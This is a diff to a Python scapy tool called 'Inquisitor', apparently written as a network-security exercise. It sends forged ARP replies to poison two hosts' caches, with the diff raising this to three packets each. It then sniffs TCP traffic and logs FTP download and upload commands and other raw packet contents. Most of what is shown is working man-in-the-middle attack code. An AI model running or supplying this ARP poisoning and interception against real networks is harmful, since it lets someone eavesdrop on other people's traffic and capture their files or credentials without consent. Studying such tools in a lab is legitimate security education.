@@ -2,10 +2,16 @@
 import argparse
 import ipaddress
 import signal
+import logging
 import typing
 import re
 from colorama import Fore, Style
-from scapy.all import ARP, send, sniff, TCP, Raw
+from scapy.all import ARP, send, sniff, TCP, Raw, IP
+
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+INCOMING = False
+OUTGOING = True
 
 class Inquisitor:
 	def __init__(self, ipsrc: str, macsrc: str, ipdst: str, macdst: str) -> None:
@@ -55,8 +61,8 @@ class Inquisitor:
 		poison_src_to_dst = ARP(op=2, pdst=self.ipdst, hwdst=self.macdst, psrc=self.ipsrc)
 		poison_dst_to_src = ARP(op=2, pdst=self.ipsrc, hwdst=self.macsrc, psrc=self.ipdst)
 
-		send(poison_src_to_dst, verbose=False)
-		send(poison_dst_to_src, verbose=False)
+		send(poison_src_to_dst, count=3, verbose=False)
+		send(poison_dst_to_src, count=3, verbose=False)
 		self.log('success', "ARP poisoning completed.")
 
 	def restore_arp_cache(self) -> None:
@@ -72,10 +78,11 @@ class Inquisitor:
 			if packet.haslayer(TCP) and packet.haslayer(Raw):
 				raw_data = packet[Raw].load
 				str_raw_data = raw_data.decode('utf-8', errors='ignore')
+				str_raw_data = str_raw_data.replace('\n', '').replace('\r', '')
 				if 'RETR' in str_raw_data:
 					self.log('log', f"FTP download detected: {str_raw_data}")
 				elif 'STOR' in str_raw_data:
-					self.log('log', f"FTP upload detected: {str_raw_data}")
+					self.log('log', f"FTP upload detected): {str_raw_data}")
 				else:
 					self.log('log', f"Packet detected: {str_raw_data}")
 		except Exception as e:
